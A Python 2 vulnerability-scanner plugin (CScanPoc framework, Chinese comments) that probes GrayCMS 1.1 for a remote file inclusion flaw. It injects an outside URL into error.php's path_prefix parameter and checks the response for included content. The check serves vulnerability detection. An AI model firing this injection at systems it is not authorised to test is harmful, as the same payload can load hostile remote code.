# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    poc_id = '2e8c8429-d511-410f-9ccb-e283de903630'
    name = 'GrayCMS 1.1 Error.PHP Remote File Include Vulnerability' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.RFI # 漏洞类型
    disclosure_date = '2005-04-26'  # 漏洞公布时间
    desc = '''
        GrayCMS 1.1 Error.PHP文件存在远程文件包含漏洞。
    ''' # 漏洞描述
    ref = 'http://alpha.hu0g4.com/' # 
    cnvd_id = 'CNVD-2005-0973' # cnvd漏洞编号
    cve_id = 'CVE-2005-1360'  # cve编号
    product = 'GrayCMS'  # 漏洞组件名称
    product_version = '1.1'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '9359792a-ce3e-48a6-b5a7-6c0d8f408503' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/code/error.php?path_prefix=http://baidu.com/robots.txt'
            response = requests.get(vul_url).content
            if 'Baiduspider' in response or 'Googlebot' in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()